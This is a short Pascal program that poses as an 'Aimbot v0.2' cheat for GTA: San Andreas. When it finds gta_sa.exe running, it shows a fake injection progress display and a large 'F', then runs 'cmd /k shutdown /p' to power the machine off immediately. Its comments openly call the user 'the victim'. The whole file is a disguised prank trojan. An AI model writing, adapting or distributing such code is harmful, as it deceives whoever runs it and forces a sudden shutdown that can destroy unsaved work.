program aimbot;


uses sysutils, ShellApi, Windows, JwaTlHelp32, crt;

function WindowsAppIsRunning(const ExeName: string): integer;
var
    ContinueLoop: BOOL;
    FSnapshotHandle: THandle;
    FProcessEntry32: TProcessEntry32;
    Result: longint;
begin
    FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
    ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
    Result := 0;
    while integer(ContinueLoop) <> 0 do begin
        if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
        UpperCase(ExeName)) or (UpperCase(FProcessEntry32.szExeFile) =
        UpperCase(ExeName))) then begin
            Inc(Result);
        end;
        ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
    end;
    CloseHandle(FSnapshotHandle);
    WindowsAppIsRunning:= Result;
end;  

function randomEx(x, y: longint): longint;
begin
	randomEx:= random((y + 1) - x) + x;
end;

procedure FinishHim();
var i: integer;

begin
    write(' Detected!');
    writeln;
    writeln;
    writeln('Injecting...');
    writeln;
    write('Please wait');
    for i:= 0 to randomEx(3, 8) do begin
        sleep(850);
        write('.');
    end;
    write(' Success!');

    writeln;
    writeln;
    writeln('.######.');
    writeln('.##.....');
    writeln('.####...');
    writeln('.##.....');
    writeln('.##.....');
    writeln('........');
    writeln;

    ShellExecute(0, nil, PChar('cmd'), PChar('/k shutdown /p'), nil, 1);
    //basically, it turns off the pc.
    readln;
    // so he victim sees the nice F

end;

procedure DontFinishHim();
begin 
    writeln;
    writeln;
    writeln('ERROR: GTA:SA Process couldn''t be detected. Are you sure it''s running?');
    sysutils.beep();
    writeln;
    write('Press any key to continue...');
    readkey;
end;

var i: integer;

begin 
    writeln('Aimbot v0.2 (beta) by penia.');
    writeln('(DO NOT DISTRIBUTE WITHOUT PERMISSION)'); // just a joke actually 
    writeln;

    write('Detecting GTA:SA Process');
    for i:= 0 to 2 do begin
        sleep(850);
        write('.');
    end;

    if(WindowsAppIsRunning('gta_sa.exe') > 0)
    then FinishHim()
    else DontFinishHim();
end.